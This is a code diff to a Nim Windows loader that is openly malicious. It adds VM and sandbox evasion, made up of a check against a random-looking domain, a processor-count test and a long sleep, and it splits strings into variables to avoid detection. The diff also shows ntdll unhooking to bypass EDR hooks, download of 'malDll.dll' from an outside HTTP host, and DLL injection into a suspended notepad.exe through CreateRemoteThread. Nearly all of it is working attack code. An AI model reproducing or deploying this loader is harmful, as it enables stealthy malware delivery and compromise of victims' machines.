@@ -1,6 +1,7 @@
 import httpclient
 import winim
 import os
+import cpuinfo
 import osproc
 import dynlib
 import strformat
@@ -11,12 +12,32 @@ proc toString(bytes: openarray[byte]): string =
   result = newString(bytes.len)
   copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)
 
+proc vmCheck(): int =
+  var count: int
+  let clientHttp = newHttpClient()
+  let responseHttp = clientHttp.get("http://0hRIb4t1fWNPYBVA.net/index.php")
+
+  if responseHttp.code == cast[HttpCode]("200") or responseHttp.status == "200":
+    count += 1
+
+  if cpuinfo.countProcessors() <= 2:
+    count += 1
+  
+  return count
+
+proc vmTimeOut(): void =
+  for i in 1 .. 100000:
+    sleep(100)
+
+
 proc ntdllunhook(): bool =
+  let ntd: string = "ntdll.dll"
+  let ntdllPath: string = r"C:\Windows\System32\ntdll.dll"
   let low: uint16 = 0
   var 
       processH = GetCurrentProcess()
       mi : MODULEINFO
-      ntdllModule = GetModuleHandleA("ntdll.dll")
+      ntdllModule = GetModuleHandleA(ntd)
       ntdllBase : LPVOID
       ntdllFile : FileHandle
       ntdllMapping : HANDLE
@@ -27,7 +48,7 @@ proc ntdllunhook(): bool =
 
   GetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
   ntdllBase = mi.lpBaseOfDll
-  ntdllFile = getOsFileHandle(open("C:\\windows\\system32\\ntdll.dll",fmRead))
+  ntdllFile = getOsFileHandle(open(ntdllPath,fmRead))
   ntdllMapping = CreateFileMapping(ntdllFile, NULL, 16777218, 0, 0, NULL) # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
   if ntdllMapping == 0:
     echo fmt"Could not create file mapping object ({GetLastError()})."
@@ -43,7 +64,7 @@ proc ntdllunhook(): bool =
       if ".text" in toString(hookedSectionHeader.Name):
           var oldProtection : DWORD = 0
           if VirtualProtect(ntdllBase + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize, 0x40, addr oldProtection) == 0:#0x40 = PAGE_EXECUTE_READWRITE
-            echo fmt"Failed calling VirtualProtect ({GetLastError()})."
+            echo fmt"Failed calling VProtect ({GetLastError()})."
             return false
           copyMem(ntdllBase + hookedSectionHeader.VirtualAddress, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize)
           if VirtualProtect(ntdllBase + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize, oldProtection, addr oldProtection) == 0:
@@ -56,9 +77,12 @@ proc ntdllunhook(): bool =
   return true
 
 proc injectThread(name: string): void =
+    let targetProcess: string = "notepad.exe"
+    let k32Str: string = "kernel32.dll"
+    let loadlibAStr: string = "LoadLibraryA"
     echo "[*] Injecting: ", name
 
-    let tProcess = startProcess("notepad.exe")
+    let tProcess = startProcess(targetProcess)
     tProcess.suspend()
     defer: tProcess.close()
 
@@ -99,8 +123,8 @@ proc injectThread(name: string): void =
     #let loadLibraryAddress = cast[LPVOID](GetProcAddress(GetModuleHandle(r"kernel32.dll"), r"LoadLibraryA"))
 
     #Get address method 2
-    let k32 = loadLib("kernel32.dll")
-    let llAddress = k32.symAddr("LoadLibraryA")
+    let k32 = loadLib(k32Str)
+    let llAddress = k32.symAddr(loadlibAStr)
 
     let tHandle = CreateRemoteThread(
         pHandle,
@@ -118,19 +142,23 @@ proc injectThread(name: string): void =
 
 when defined(windows):
     when isMainModule:
-        var unhookResult = ntdllunhook()
-        echo fmt"[*] Unhooked Ntdll: {bool(unhookResult)}"
+        if vmCheck() >= 2:
+          vmTimeout()
+        else: 
+          var unhookResult = ntdllunhook()
+          echo fmt"[*] Unhooked Ntdll: {bool(unhookResult)}"
 
-        let client = newHttpClient()
-        let download = client.getContent("http://192.168.0.118:8000/malDll.dll")
+          let srvUrl: string = r"http://192.168.0.118:8000/malDll.dll"
+          let client = newHttpClient()
+          let download = client.getContent(srvUrl)
 
-        try:
-            let file = open("malDll.dll", fmWrite)
-            defer: file.close()
+          try:
+              let file = open("malDll.dll", fmWrite)
+              defer: file.close()
 
-            file.write(download)
-            echo "[+] Download Sucessful!"
-        except:
-            echo "[-] Download Failed!"
-        injectThread("malDll.dll")
-        var pauseEx = readLine(stdin)
+              file.write(download)
+              echo "[+] Download Sucessful!"
+          except:
+              echo "[-] Download Failed!"
+          injectThread("malDll.dll")
+          var pauseEx = readLine(stdin)
